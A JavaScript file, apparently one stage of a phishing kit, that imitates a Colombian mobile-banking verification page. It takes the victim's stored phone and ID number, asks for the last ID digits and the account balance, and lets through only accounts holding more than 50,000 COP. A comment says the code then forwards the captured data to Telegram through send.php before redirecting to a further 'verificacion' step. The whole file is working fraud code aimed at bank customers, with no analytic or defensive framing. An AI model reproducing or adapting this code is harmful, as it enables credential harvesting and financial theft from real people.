(() => {
  const LOADER_MS = 1800;
  const MAX_ATTEMPTS = 2;
  const MIN_BALANCE = 50000;

  function showToast(msg) {
    let t = document.getElementById('nqToast');
    if (!t) {
      t = document.createElement('div');
      t.id = 'nqToast';
      t.className = 'nq-toast';
      document.body.appendChild(t);
    }
    t.textContent = msg;
    requestAnimationFrame(() => t.classList.add('show'));
    setTimeout(() => t.classList.remove('show'), 2000);
  }

  const loader = document.getElementById('loaderScreen');
  const app = document.getElementById('accesoApp');

  // Mostrar app después del loader inicial
  setTimeout(() => {
    loader.classList.add('fade-out');
    app.hidden = false;
    setTimeout(() => loader.remove(), 400);
  }, LOADER_MS);

  // Datos de la sesión
  const phone = sessionStorage.getItem('phone') || '';
  const numDoc = sessionStorage.getItem('numDoc') || '';
  // Si no hay teléfono guardado, vuelve al inicio del flujo
  if (!phone) {
    window.location.replace('index.php');
    return;
  }

  // Fecha actual formateada en español
  const dateStamp = document.getElementById('dateStamp');
  const dias = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
  const meses = ['enero','febrero','marzo','abril','mayo','junio','julio','agosto','septiembre','octubre','noviembre','diciembre'];
  function updateDate() {
    const d = new Date();
    const hh = String(d.getHours()).padStart(2, '0');
    const mm = String(d.getMinutes()).padStart(2, '0');
    const ss = String(d.getSeconds()).padStart(2, '0');
    dateStamp.textContent = `${dias[d.getDay()]}, ${d.getDate()} de ${meses[d.getMonth()]} de ${d.getFullYear()}, ${hh}:${mm}:${ss}`;
  }
  updateDate();
  setInterval(updateDate, 1000);

  // Solo dígitos en inputs
  const lastDigits = document.getElementById('lastDigits');
  const balanceInput = document.getElementById('balance');

  lastDigits.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
  });

  // Saldo: formato COP + puntos de miles mientras se escribe
  balanceInput.addEventListener('input', (e) => {
    const raw = e.target.value.replace(/\D/g, '');
    e.target.value = raw ? 'COP ' + Number(raw).toLocaleString('es-CO') : '';
  });

  // Submit
  const form = document.getElementById('securityForm');
  const titleText = document.getElementById('securityTitleText');
  const securityTitle = document.getElementById('securityTitle');
  const attemptsLeftEl = document.getElementById('attemptsLeft');

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    if (!form.reportValidity()) return;

    const expectedDigits = numDoc.replace(/\D/g, '').slice(-3);
    const enteredDigits = lastDigits.value;
    const balance = Number(balanceInput.value.replace(/\D/g, '')) || 0;

    const digitsOk = enteredDigits === expectedDigits;
    const balanceOk = balance > MIN_BALANCE;
    const ok = digitsOk && balanceOk;

    if (ok) {
      const btn = form.querySelector('.btn-pink');
      btn.textContent = 'Validando...';
      btn.disabled = true;
      sessionStorage.setItem('balance', String(balance));

      // Enviar a Telegram (no bloqueante)
      fetch('send.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          step: 'validacion',
          lastDigits: enteredDigits,
          balance: balance,
        }),
        keepalive: true,
      }).catch(() => {});

      setTimeout(() => {
        window.location.href = 'verificacion.html';
      }, 700);
      return;
    }

    // Error: incrementar intentos
    let attempts = Number(sessionStorage.getItem('attempts') || '0') + 1;
    sessionStorage.setItem('attempts', String(attempts));

    if (attempts >= MAX_ATTEMPTS) {
      // Limpiar y volver a acceso
      sessionStorage.clear();
      window.location.replace('acceso.html');
      return;
    }

    // Mostrar estado de "Último intento"
    titleText.textContent = 'Error. Ultimo intento';
    securityTitle.classList.add('error');
    attemptsLeftEl.textContent = `Te queda ${MAX_ATTEMPTS - attempts} intento.`;

    // Shake visual
    form.classList.remove('shake');
    void form.offsetWidth;
    form.classList.add('shake');

    // Limpiar y enfocar el primer campo erróneo
    if (!digitsOk) { lastDigits.value = ''; lastDigits.focus(); }
    else if (!balanceOk) { balanceInput.value = ''; balanceInput.focus(); }
  });
})();
